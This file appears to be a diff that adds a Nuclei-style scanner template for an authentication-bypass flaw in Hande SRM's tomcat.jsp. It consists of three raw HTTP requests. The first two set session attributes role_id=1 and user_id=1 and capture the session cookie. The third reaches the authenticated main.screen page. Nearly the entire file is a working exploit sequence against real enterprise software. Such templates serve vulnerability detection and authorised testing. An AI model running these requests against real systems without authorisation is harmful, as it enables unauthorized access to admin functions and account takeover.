@@ -1,0 +1,60 @@
+id: hande-srm-tomcat-bypass
+info:
+  name: Hande SRM tomcat.jsp Permission Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Hande SRM tomcat.jsp permission bypass vulnerability allows an attacker to bypass authentication and gain unauthorized access to sensitive system functionalities.
+  tags: permission-bypass
+  reference:
+    - https://www.hand-china.com
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - raw:
+      - |
+        GET /tomcat.jsp?dataName=role_id&dataValue=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        words:
+          - "Session"
+          - "role_id = 1"
+        part: body
+      - type: status
+        status: [200]
+    extractors:
+      - type: regex
+        name: session_cookie
+        part: header
+        regex:
+          - "(?i)Set-Cookie:\\s*(.*?);"
+        internal: true
+
+  - raw:
+      - |
+        GET /tomcat.jsp?dataName=user_id&dataValue=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{session_cookie}}
+    matchers:
+      - type: word
+        words:
+          - "user_id = 1"
+        part: body
+      - type: status
+        status: [200]
+
+  - raw:
+      - |
+        GET /main.screen HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{session_cookie}}
+    matchers:
+      - type: word
+        words:
+          - "main.screen"
+          - "updatePassword()"
+        part: body
+      - type: status
+        status: [200]
